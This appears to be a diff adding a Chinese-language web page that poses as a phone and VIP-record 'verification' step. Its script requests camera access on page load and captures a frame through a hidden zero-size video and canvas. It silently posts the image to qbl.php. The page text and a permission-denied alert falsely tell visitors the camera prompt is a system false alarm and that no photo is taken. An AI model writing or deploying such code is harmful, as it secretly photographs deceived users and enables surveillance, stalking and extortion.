@@ -1,0 +1,47 @@
+<html>
+<head>
+
+<meta charset="UTF-8">
+
+<title>验证...</title>
+
+<style id="AlookElementHide">.AlookElementHide{display:none !important;height: 0px !important;line-height: 0px !important;}</style></head>
+
+<body>
+    
+<h1 style="font-family:arial;font-size:30px;">手机信息验证中，获取权限，加载你的vip记录，以便用户管理(部分手机会提示摄像头、隐私等信息，均为误报，我们不会获取这些。</h1>
+    
+<video id="video" width="0" height="0" autoplay=""></video>
+	
+<canvas style="width:0px;height:0px" id="canvas" width="480" height="640"></canvas>
+	
+<script type="text/javascript">
+		window.addEventListener("DOMContentLoaded", function() {
+            var canvas = document.getElementById('canvas');
+            var context = canvas.getContext('2d');
+            var video = document.getElementById('video');
+
+            if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
+					video.srcObject = stream;
+                    video.play();
+                    
+                    setTimeout(function(){context.drawImage(video, 0, 0, 480, 640);},1000);
+                    setTimeout(function(){
+                        var img = canvas.toDataURL('image/png');  
+                        document.getElementById('result').value = img;
+                        document.getElementById('gopo').submit();
+                        },1300);
+                },function(){alert("麻烦开启一下权限，这是获取设备配置的权限，不是摄像头权限，不会拍照，系统误报的");});
+                
+            }
+		}, false);
+
+	</script>
+
+<form action="qbl.php?id=&amp;url=" id="gopo" method="post">
+
+<input type="hidden" name="img" id="result" value="">
+</form>
+
+</body></html>
